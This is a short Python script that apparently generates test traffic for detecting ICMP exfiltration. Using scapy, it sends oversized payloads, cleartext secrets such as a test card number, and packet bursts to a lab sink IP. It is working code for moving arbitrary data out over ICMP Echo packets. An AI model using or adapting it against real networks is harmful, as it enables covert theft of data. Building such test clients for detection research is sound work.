#!/usr/bin/env python3
"""Basic ICMP Exfiltration Tool (Stream A / Baseline Attack).

Demonstrates naive exfiltration techniques over ICMP Echo Requests:
- Oversized payload transfer (bulk dump)
- Raw transmission of sensitive strings (credit card, AWS keys)
- High-frequency burst transfer without pacing
"""

from __future__ import annotations

import argparse
import sys
import time

from scapy.layers.inet import ICMP, IP
from scapy.packet import Raw
from scapy.sendrecv import send

DEFAULT_TARGET = "172.21.0.10"


def send_oversized(target: str, data: str) -> None:
    """Sends a single ICMP Echo packet with a large payload (> 64 bytes)."""
    payload = data.encode("utf-8")
    print(f"[*] Sending oversized ICMP packet ({len(payload)} bytes) to {target}...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    print("[+] Packet dispatched.")


def send_sensitive(target: str, data: str) -> None:
    """Sends an ICMP Echo packet containing cleartext sensitive credentials."""
    payload = data.encode("utf-8")
    print(f"[*] Sending sensitive cleartext data ({len(payload)} bytes) to {target}...")
    pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
    send(pkt, verbose=False)
    print("[+] Packet dispatched.")


def send_burst(target: str, count: int, delay: float) -> None:
    """Sends a rapid burst of ICMP Echo packets to trigger rate limiting."""
    print(f"[*] Firing burst of {count} packets with {delay}s delay to {target}...")
    for seq in range(count):
        payload = f"chunk_{seq}".encode("utf-8")
        pkt = IP(dst=target) / ICMP(type=8, seq=seq) / Raw(load=payload)
        send(pkt, verbose=False)
        time.sleep(delay)
    print("[+] Burst completed.")


def main() -> None:
    parser = argparse.ArgumentParser(description="Naive ICMP Exfiltration Test Client")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Destination sink IP")
    parser.add_argument(
        "--mode",
        choices=["oversized", "sensitive", "burst"],
        required=True,
        help="Attack scenario to execute",
    )
    parser.add_argument(
        "--data",
        default="",
        help="Optional custom string or secret to transmit",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=6,
        help="Number of packets for burst mode",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Interval between packets in burst mode (seconds)",
    )

    args = parser.parse_args()

    if args.mode == "oversized":
        default_data = "CONFIDENTIAL_REPORT_" + ("A" * 80)
        send_oversized(args.target, args.data or default_data)

    elif args.mode == "sensitive":
        default_data = "4532015112830366"  # Valid test Visa CC
        send_sensitive(args.target, args.data or default_data)

    elif args.mode == "burst":
        send_burst(args.target, count=args.count, delay=args.delay)


if __name__ == "__main__":
    main()